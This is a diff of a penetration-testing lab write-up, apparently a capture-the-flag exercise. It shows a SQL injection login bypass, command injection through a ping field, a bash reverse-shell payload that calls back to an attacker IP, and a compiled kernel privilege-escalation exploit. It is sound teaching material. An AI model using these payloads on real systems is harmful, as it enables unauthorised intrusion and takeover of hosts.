@@ -22,7 +22,7 @@ There are a little over 4000 packets in this pcap file but most of them don’t 
 
 ![S](Images/ThatsBetter.png)
 
-That’s much better! We found a full OpenVPN key. With a little research about OpenVPN keys I find that I can copy this text directly into a file with the extension .ovpn and connect to the range using the command ``sudo openvpn <filenamehere>.ovpn``
+That’s much better! A full OpenVPN key, and with a little research about OpenVPN keys (opening my Try Hack Me key in vim) I find that I can copy this text directly into a file with the extension `.ovpn` and connect to the range using the command ``sudo openvpn <filenamehere>.ovpn``
 
 #### ***90s hacker voice*** Im in.
 ![S](Images/ImIn.png)
@@ -34,7 +34,7 @@ Anyway, back to port scanning starting with...
 ## Box 1
 ![S](Images/nmap1.png)
 
-Going for the low hanging fruit (and the best option here), I decide to go check out the website on `port 8080`. I’m greeted with a basic admin login page with the URL extension `index.php`. This lets gives me an idea that I may be able to perform a sql injection but I’m still not sure.
+Going for the low hanging fruit (and the best option here), I decide to go check out the website on `8080`. I’m greeted with a basic admin login page with the URL extension, `index.php`. This lets gives me an idea that I may be able to perform some sort of injection, but I’m still not sure.
 
 ![S](Images/phpAdminPage.png)
 
@@ -43,12 +43,12 @@ So, I fire up Burp Suite and check out what’s happening when i hit the login b
 ![S](Images/burping.png)
 
 Ok there's probably something here. 
-Let’s send this to the repeater module in Burp and check out what’s going on. `ctrl+R` is a quick shortcut for moving requests from the Proxy tab into the Repeater Tab. Here, we can manipulate our requests for testing the right sort of attack.
-I’m focusing on the bottom line of this request, as this is where our username and password data goes. I added a single character in the username field and got this response back.
+Let’s send this to the repeater module in Burp and check out what’s going on. `ctrl+R` is a quick shortcut for moving requests from the Proxy tab into the Repeater Tab. Here, I can manipulate requests for testing the right sort of attack.
+I’m focusing on the bottom line of this request, as this is where username and password data goes. I added a single character in the username field and got this response back.
 
 ![S](Images/burping2.png)
 
-This looks like the HTML for the login page. But what if I put some SQL into that field?
+This looks like its the HTML for the login page, but what if I put some SQL into that field?
 Maybe like, a common administrator name like `admin` along with `'OR '1'='1` What would happen?
 
 ![S](Images/burping3.png)
@@ -67,7 +67,7 @@ So, I pinned a Print Working Directory command to the end of that local host pin
 ![S](Images/Localpwd.png)
 
 From here it was just a matter of making this machine (target) call back to my (attacker) machine.
-As always, I set up a net cat listener on my (attacker) machine using the command `nc -lvnp 4444` and then I went over to [pentest monkey's](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) reverse shell cheat sheet where I got the bash reverse shell.
+As always, I set up a net cat listener on my (attacker) machine using the command `nc -lvnp 4444` and then I went over to [pentest monkey's reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) where I got the bash reverse shell.
 
 When appended to the end of the localhost ping, the final command looked like this: 
 `127.0.0.1;bash -i >& /dev/tcp/10.0.0.0/4444 0>&1`
@@ -115,13 +115,13 @@ Finally, its time to compile and exploit. This can all be done with one single c
 The final command looks like this: `$ gcc 9545.c -o 9545 && ./9545`
 
 ![S](Images/rootaccess.png)
-**We have root**
+**ROOT ACHIEVED**
 
 ## Final thoughts on this first box
 
-I had a great time with this exercise. It was a good way to get some practice with Linux privilege escalation exploits that I don’t often get. Most of my experience with Linux priv esc comes in the form of exploiting cronjobs or SUID permissions. So, needless to say this was a welcome change of pace for me. 
+Well, I had a great time with this exercise. It was a good way to get some practice with Linux privilege escalation exploits that I don’t often get to use. Most of my experience with Linux priv esc comes in the form of exploiting cronjobs or SUID permissions. So, this was a welcome change of pace for me. 
 
-Any questions? Feel free to contact me via email: jwautry93@gmail.com you can also reach out to me on my [LinkedIn](https://www.linkedin.com/in/jwautry/) 
+Any questions? Comments? Want to tell me I got something wrong? Feel free to contact me via email: jwautry93@gmail.com you can also reach out to me on my [LinkedIn](https://www.linkedin.com/in/jwautry/) 
 
 More write-ups will be coming in the future, so make sure to keep a look out for those. I have 2 more boxes to chronicle in this series and loads more projects to take on after that.
 
